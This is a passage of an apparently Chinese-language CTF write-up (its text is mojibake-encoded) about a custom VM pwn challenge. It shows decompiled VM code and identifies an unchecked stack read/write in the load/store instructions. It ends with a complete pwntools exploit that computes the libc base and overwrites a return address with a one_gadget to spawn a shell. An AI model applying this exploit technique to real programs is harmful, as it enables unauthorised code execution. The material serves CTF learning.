[rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  mem-&gt;CS_code_start = code;</span><br><span class="line">  mem-&gt;code_size = size;</span><br><span class="line">  result = mem;</span><br><span class="line">  mem-&gt;RIP = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = mem;</span><br><span class="line">    mem-&gt;regs[i] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™šæ‹Ÿæœºç»“æ„ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> // <span class="title">sizeof</span>=</span><span class="number">0x118</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: .bss:vm/r</span></span><br><span class="line"><span class="number">00000000</span>     __int64 regs[<span class="number">32</span>];</span><br><span class="line"><span class="number">00000100</span>     __int64 RIP;</span><br><span class="line"><span class="number">00000108</span>     __int64 CS_code_start;</span><br><span class="line"><span class="number">00000110</span>     <span class="type">unsigned</span> __int64 code_size;</span><br><span class="line"><span class="number">00000118</span> &#125;;</span><br></pre></td></tr></table></figure><h2 id="é€†å‘æŒ‡ä»¤é›†">é€†å‘æŒ‡ä»¤é›†</h2><p>è¿™é‡Œå¤ç°çš„æ—¶å€™ä¹Ÿå¤´æ™•çš„ä¸è¡Œï¼Œæˆ‘ä»¬å…ˆçœ‹æ‰§è¡Œå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">execute</span><span class="params">(<span class="keyword">struct</span> vm *vm)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> insn; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE s[<span class="number">264</span>]; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( vm-&gt;RIP &lt; vm-&gt;code_size )</span><br><span class="line">  &#123;</span><br><span class="line">    insn = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL)) &gt;&gt; <span class="number">28</span>;<span class="comment">// ripæŒ‡é’ˆå››å­—èŠ‚å¯¹é½</span></span><br><span class="line">    <span class="keyword">if</span> ( insn &gt; <span class="number">0xA</span> || !insn )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Unsupported instruction&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> vm *, _BYTE *))funcs_1AAD[insn])(vm, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè™šæ‹ŸæœºæŒ‡ä»¤æœ€ç»ˆçš„æ‰§è¡Œæ˜¯å€ŸåŠ©ä¸€ä¸ªvtableå®ç°çš„ã€‚é€ä¸€åˆ†ævtableé‡Œçš„å‡½æ•°å°±èƒ½è¿˜åŸæŒ‡ä»¤çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬add,subç­‰å¸¸è§è¿ç®—ä¸ä¸¤ä¸ªå…³é”®çš„è®¿å­˜æŒ‡ä»¤æŒ‡ä»¤åŒ…å«ä¸‰ä¸ªæ“ä½œæ•°å’Œä¸€ä¸ªæ“ä½œç ã€‚æœ€é«˜4ä½æ˜¯æ“ä½œæ•°ï¼Œé™åˆ¶ä¸º0-10ï¼Œç”¨äºä¸‹æ ‡ç›´æ¥ä»vtableä¸­ç´¢å¼•æ“ä½œã€‚è€Œå…¶ä½™ä¸‰ä¸ªæ“ä½œæ•°å¯¹äºè¿ç®—æŒ‡ä»¤æ¥è¯´ï¼Œåˆ†ä¸ºæœ€ä½5ä½ï¼Œæ¬¡5ä½å’Œé«˜å­—çš„ä½5ä½ï¼ˆ16-20ï¼‰ã€‚ç”¨5ä½æ•°0-31æ¥åœ¨32ä¸ªé€šç”¨å¯„å­˜å™¨ä¸­ç´¢å¼•æ“ä½œï¼Œç¬¬ä¸€æ“ä½œæ•°ä¸º5-9ï¼Œç¬¬äºŒæ“ä½œæ•°ä½16-20ï¼Œç¬¬ä¸‰æ“ä½œæ•°ï¼ˆç»“æœå¯„å­˜å™¨ï¼‰ä¸º0-4.</p><blockquote><p>ps: è¿™é‡Œç»•äº†æˆ‘åŠå¤©ï¼Œæ¯æ¬¡çœ‹ç€çœ‹ç€å°±ä¸è®°å¾—å“ªä¸ªå‡å“ªä¸ªäº†ï¼Œä¹Ÿä¸ç¡®å®šè‡ªå·±å°è£…çš„å¯¹ä¸å¯¹â€¦</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">sub</span><span class="params">(<span class="keyword">struct</span> vm *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(_DWORD *)(a1-&gt;CS_code_start + (a1-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  a1-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1-&gt;regs[v2 &amp; <span class="number">0x1F</span>] = a1-&gt;regs[(v2 &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] - a1-&gt;regs[HIWORD(v2) &amp; <span class="number">0x1F</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œä¸¤ä¸ªè®¿å­˜æŒ‡ä»¤åˆ™æ¯”è¾ƒç‰¹åˆ«ï¼Œå¯¹äºloadï¼Œå…¶å¯ä»¥ä»ä¸€ä¸ªæŒ‡å®šåœ°å€åŠ è½½8å­—èŠ‚åˆ°ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨ã€‚è™šæ‹Ÿæœºè¿è¡ŒæŒ‡ä»¤æ—¶ä¼šåœ¨è°ƒç”¨æŒ‡ä»¤å‰çš„ä¸€ä¸ªå‡½æ•°å†…åˆ†é…ä¸€æ®µç©ºé—´å¹¶ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚è¿™ä¸ªæŒ‡ä»¤ä¹Ÿæ˜¯ä¸‰ä¸ªæ“ä½œæ•°ï¼Œä¸åŒçš„æ˜¯ä¼šç”¨ä¸€ä¸ªå¯„å­˜å™¨åšåŸºåœ°å€ï¼Œé«˜å­—çš„ä½12ä½åšåç§»æ¥é’ˆå¯¹a2åšç´¢å¼•ï¼Œç„¶åç»“æœæ”¾å…¥ç»“æœå¯„å­˜å™¨ã€‚storeåˆ™ä¸å…¶ç›¸åï¼Œå‚æ•°è§„åˆ™ä¸€æ ·ï¼Œæ˜¯å°†ç»“æœå¯„å­˜å™¨å†…å®¹å­˜å…¥æŒ‡å®šåœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">load</span><span class="params">(<span class="keyword">struct</span> vm *vm, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+1Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cur_instruc; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  cur_instruc = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  vm-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)(<span class="type">unsigned</span> __int8)byte_4010;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + BYTE2(cur_instruc)) &lt; (<span class="type">unsigned</span> __int8)byte_4010 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = vm;</span><br><span class="line">    v3 = vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + (HIWORD(cur_instruc) &amp; <span class="number">0xFFF</span>);</span><br><span class="line">    vm-&gt;regs[cur_instruc &amp; <span class="number">0x1F</span>] = ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">7</span>] &lt;&lt; <span class="number">56</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">6</span>] &lt;&lt; <span class="number">48</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">5</span>] &lt;&lt; <span class="number">40</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">4</span>] &lt;&lt; <span class="number">32</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | *(<span class="type">unsigned</span> __int16 *)&amp;a2[v3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>æ¼æ´åˆ†æ</h1><p>æ˜¾ç„¶ï¼Œè®¿å­˜æŒ‡ä»¤çš„æƒé™å¤ªå¤§äº†ã€‚è¿™ä¸ªæŒ‡ä»¤é‡Œçš„åç§»èƒ½ç´¢å¼•0xfffï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ªç›¸å½“å¤§èŒƒå›´çš„æ ˆä¸Šä»»æ„è¯»å†™ã€‚æ„é€ ROPæˆ–è€…ç›´æ¥ret2ogéƒ½æ˜¯å¯ä»¥çš„ã€‚ä¸è¿‡è¿™é“é¢˜çš„éš¾ç‚¹æ˜¯ï¼Œä»–æ²¡æœ‰æ³„éœ²ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å»å‡‘libcåœ°å€ï¼Œæ‰€ä»¥ä»æ ˆä¸Šæƒ³åŠæ³•æ‰¾ä¸€ä¸ªâ€œå¥½â€çš„åœ°å€å°±æˆä¸ºäº†æœ¬é¢˜çš„å…³é”®ã€‚ä½†æ¯”è¾ƒæ¶å¿ƒçš„æ˜¯ï¼Œå¯èƒ½ç”±äºaslrçš„å­˜åœ¨ï¼Œæ ˆå†…éƒ¨çš„åç§»è®¸å¤šéƒ½æ˜¯ä¸å›ºå®šçš„ï¼Œå› æ­¤è¿™é“é¢˜è®©æˆ‘æŒæ¡äº†ä¸€ä¸ªå¾ˆå®è´µçš„ç»éªŒï¼Œä¹Ÿå°±æ˜¯<strong>åˆç†ä½¿ç”¨search+distanceæŒ‡ä»¤ç»„åˆæ‹³</strong>ã€‚</p><blockquote><p>å¦å¤–æœ‰ä¸€ä¸ªç®€å•çš„ç‚¹ï¼Œç”±äº0xfffå®åœ¨å¤ªå¤§äº†ï¼Œæˆ‘ä»¬å¯ä»¥loadå’Œstoreæˆ‘ä»¬è¾“å…¥çš„codeå†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´åŸºæœ¬æ˜¯ç›´çƒçš„æ ˆä¸Šä»»æ„åœ°å€è¯»å†™ã€‚</p></blockquote><h2 id="pwndbgå¥½ç”¨æ">pwndbgå¥½ç”¨æ</h2><p>pwndbgä¸ºæˆ‘ä»¬æä¾›äº†è½®æ¤…ä¸ºä»€ä¹ˆä¸ç”¨ï¼Ÿè°ƒè¯•è¿‡ç¨‹ä¸­ä¼šä»¥è¿”å›åœ°å€å½¢å¼æ˜¾ç¤ºå‡½æ•°è°ƒç”¨å †æ ˆï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ‰¾æœ€è¿‘çš„libcå†…åœ°å€ï¼Œç›´æ¥<code>search -t pointer</code>ï¼Œç„¶å<code>distance $rsi</code>ï¼Œå°±èƒ½çœ‹åˆ°éœ€è¦å¤šå°‘çš„åç§»ã€‚æ‰¾ä¸€ä¸ªä¸å˜çš„å³å¯ï¼Œæ¯”stackä¹‹åè‚‰çœ¼è§‚å¯Ÿå¼ºå¤ªå¤šäº†ã€‚</p><h2 id="onegadget">onegadget</h2><p>è¿™é‡Œogé€‰å–ä¸æ˜¯å¾ˆå®¹æ˜“ï¼Œæ”¹å®Œè¿”å›åœ°å€ç¨‹åºé€€å‡ºårbpæ˜¯0x1å¯¼è‡´å¾ˆå¤šæ¡ä»¶ç®€å•çš„ogç”¨ä¸äº†ï¼Œè¿™ä¸ªæ˜¯ç›´æ¥ä»ç½‘ä¸Šçš„wp copyçš„ï¼Œå®æˆ˜è¿‡ç¨‹ä¸­å¯ä»¥ä¸€ä¸ªä¸ªè¯•ä¸€è¯•ï¼ŒæŒ‡å®š<code>-l 1</code>ä¹‹åå…¶å®ä¹Ÿæ²¡æœ‰å¤ªå¤šã€‚</p><h1>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> p32</span><br><span class="line">context.terminal=[<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>,checksec=<span class="literal">False</span>)</span><br><span class="line">libc=elf.libc</span><br><span class="line">p = process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="comment"># 4å­—èŠ‚æŒ‡ä»¤</span></span><br><span class="line"><span class="comment"># 32ä½</span></span><br><span class="line"><span class="comment"># é«˜å››ä½æ˜¯æ“ä½œç ï¼Œä»0-10å¯¹åº”10ä¸ªæŒ‡ä»¤</span></span><br><span class="line"><span class="comment"># ä½5ä½æ˜¯ä¸€ä¸ªå¯„å­˜å™¨</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment"># 4 7 5 | 6 5 5</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å‚æ•°å…¨éƒ¨éƒ½æ˜¯å¯„å­˜å™¨ç¼–å·</span></span><br><span class="line"><span class="comment"># a op b -&gt; c</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">code</span>(<span class="params">op,a,b,c</span>):</span><br><span class="line">    <span class="keyword">return</span> p32(((op &amp; <span class="number">0xF</span>)&lt;&lt;<span class="number">28</span>) + ((b &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">16</span>) + ((a &amp; <span class="number">0x1f</span>)&lt;&lt;<span class="number">5</span>) + (c &amp; <span class="number">0x1f</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">1</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sub</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">2</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">3</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">div</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">4</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">5</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">my_and</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">6</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">slr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">7</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shr</span>(<span class="params">a,b,result</span>):</span><br><span class="line">    <span class="keyword">return</span> code(<span class="number">8</span>,a,b,result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">store</span>(<span class="params">base,offset,content</span>):</span><br><span class="line">    op = <span class="number">0x9</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    cont = content &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + cont)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load</span>(<span class="params">base,offset,r</span>):</span><br><span class="line">    op = <span class="number">0xA</span> &lt;&lt; <span class="number">28</span></span><br><span class="line">    off = (offset &amp; <span class="number">0xFFF</span>) &lt;&lt; <span class="number">16</span></span><br><span class="line">    target = r &amp; <span class="number">0x1F</span></span><br><span class="line">    b = (base &amp; <span class="number">0x1f</span>) &lt;&lt; <span class="number">5</span></span><br><span class="line">    <span class="keyword">return</span> p32(op + off + b + target)</span><br><span class="line"></span><br><span class="line"><span class="comment"># æŒ‡ä»¤æœ¬èº«æä¾›ä»»æ„åœ°å€è¯»å†™</span></span><br><span class="line"><span class="comment"># å› æ­¤éœ€è¦æ‰¾åˆé€‚åœ°å€åšå†™å…¥ï¼Œcodeå°±åœ¨æ ˆä¸Šï¼Œå·åœ°å€å‡ºæ¥ç„¶åè¯•ç€æ”¹</span></span><br><span class="line"><span class="comment"># ä¸€èˆ¬è¿™ç§é¢˜çš„æ€è·¯éƒ½æ˜¯å…ˆè¯•ogï¼Œä¸è¡Œå†è¯•è¯•system</span></span><br><span class="line"><span class="comment"># é¦–å…ˆï¼Œå…ˆæ£€æŸ¥æ³„éœ²ï¼Œè¿™é“é¢˜æ²¡æœ‰ä»»ä½•è¾“å‡ºå†…å®¹ï¼Œè¦æ³„éœ²éœ€è¦è‡ªå·±è°ƒputsï¼Œä¼šå¾ˆéº»çƒ¦</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿™é“é¢˜çš„æ ¸å¿ƒæ˜¯è¦æƒ³åŠæ³•åœ¨å¯„å­˜å™¨å‡‘å‡ºä¸€ä¸ªå…³é”®çš„å†™å…¥åœ°å€</span></span><br><span class="line"><span class="comment"># ä»–å¦ˆçš„æˆ‘çš„è„‘å­å°±æ˜¯ç»•ä¸è¿‡æ¥è¿™ä¸ªæŒ‡ä»¤</span></span><br><span class="line"><span class="comment"># å“¦ï¼ŒåŸæ¥æ˜¯åœ¨æ‰§è¡Œè®¿å­˜æŒ‡ä»¤æ—¶ä¼šé¢å¤–ä¼ å…¥ä¸€ä¸ªæ ˆä¸Šçš„åœ°å€åšåç§»ï¼Œæˆ‘ä»¬ç›¸å½“äºå¯ä»¥åœ¨æ ˆä¸Šä¸€ä¸ªåœ°å€åç§»0x100èŒƒå›´å†…æ“ä½œ</span></span><br><span class="line"><span class="comment"># å¯ä»¥ä»æ ˆä¸Šæ‰¾å¥½çš„åœ°å€</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># search -t dword 0xa1200001</span></span><br><span class="line"><span class="comment"># distance $rsi 0xxxxxxxxx</span></span><br><span class="line"><span class="comment"># x /20gx $rebase(0x40c0) æ£€éªŒ</span></span><br><span class="line"><span class="comment"># å¯ä»¥å°†å¯„å­˜å™¨å†™å…¥æˆ‘ä»¬çš„å†…å®¹ï¼Œ0x120å¼€å§‹æ˜¯æˆ‘ä»¬çš„å†…å®¹</span></span><br><span class="line"><span class="comment"># ogæ˜¯ä¾¿å®œï¼Œè‡³å°‘ç”¨ä¸€æ¬¡subï¼Ÿ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ€è·¯ï¼š</span></span><br><span class="line"><span class="comment"># targetå†™å…¥code-&gt;è¯»å–åˆ°å¯„å­˜å™¨ä¸­å¤‡ç”¨</span></span><br><span class="line"><span class="comment"># æ‰¾ä¸€ä¸ªlibcåœ°å€-&gt;åœ¨æˆ‘ä»¬çš„codeé‡Œå†™å…¥åç§»-&gt;éƒ½è¯»åˆ°å¯„å­˜å™¨é‡Œåšsubå‡ºbase-&gt;è¯»å…¥og-&gt;ç›¸åŠ æ‹¿åˆ°ogçœŸå®åœ°å€-&gt;å°†ogå†™å…¥target</span></span><br><span class="line"><span class="comment"># å¥½ä»–å¦ˆçš„ç»•å•Šæˆ‘æ“äº† payloadæ€è·¯å…¨æœ‰ä½†æ˜¯å†™ç€å¾ˆè´¹åŠ²ä¸çŸ¥é“æ€ä¹ˆå¼€å§‹</span></span><br><span class="line"><span class="comment"># vmå¿ƒé­”ï¼Ÿï¼Ÿ</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æƒ³åŠæ³•å…ˆç®—å‡ºlibcçœŸå®çš„åŸºåœ°å€å­˜åœ¨ä¸€ä¸ªå¯„å­˜å™¨é‡Œ</span></span><br><span class="line"><span class="comment"># onegadget = 0x</span></span><br><span class="line"><span class="comment"># è¯»å–ç›®æ ‡å†™å…¥å†…å®¹ï¼ˆogçš„åç§»æ”¾åœ¨3äº†ï¼‰</span></span><br><span class="line"><span class="comment"># payload = load(0,0x120,1) + load(0,0x124,2) + add(1,2,3)</span></span><br><span class="line"><span class="comment"># è¯»å–ä¸€ä¸ªåç§»</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è¯»å–ä¸€ä¸ªlibcåœ°å€</span></span><br><span class="line"><span class="comment"># off: 0x29d90</span></span><br><span class="line"><span class="comment"># å¸¸è¯†ï¼š2.35çš„libc_start_mainåœ¨æ ˆä¸Šå­˜å‚¨å€¼åç§»ä¸º0x29d90</span></span><br><span class="line">one_gadget = <span class="number">0x50a47</span></span><br><span class="line">payload = load(<span class="number">0</span>,<span class="number">0xd38</span>,<span class="number">1</span>) <span class="comment">#å“¦æˆ‘sbäº†è¯»æ˜¯è¯»8å­—èŠ‚</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x140</span>,<span class="number">9</span>) + sub(<span class="number">1</span>,<span class="number">9</span>,<span class="number">4</span>) <span class="comment"># 4æ˜¯libcçš„åŸºåœ°å€</span></span><br><span class="line"><span class="comment"># è‰æ‹Ÿå—ï¼Œè¿™ä¸ªåœ°å€åœ¨wsl kalié‡Œä¹Ÿä¸€ç›´è·³</span></span><br><span class="line"><span class="comment"># ç®—og</span></span><br><span class="line">payload += load(<span class="number">0</span>,<span class="number">0x138</span>,<span class="number">8</span>) + add(<span class="number">8</span>,<span class="number">4</span>,<span class="number">5</span>) <span class="comment"># 5ä¸ºogçœŸå®å€¼</span></span><br><span class="line"><span class="comment"># å†™å…¥</span></span><br><span class="line">payload += store(<span class="number">0</span>,<span class="number">0x118</span>,<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(one_gadget) + p64(<span class="number">0x29d90</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;opcode: &quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1&gt;é¢˜ç›®åˆ†æ&lt;/h1&gt;
&lt;h2 id=&quot;é€†å‘è™šæ‹Ÿæœºç»“æ„&quot;&gt;é€†å‘è™šæ‹Ÿæœºç»“æ„&lt;/h2&gt;
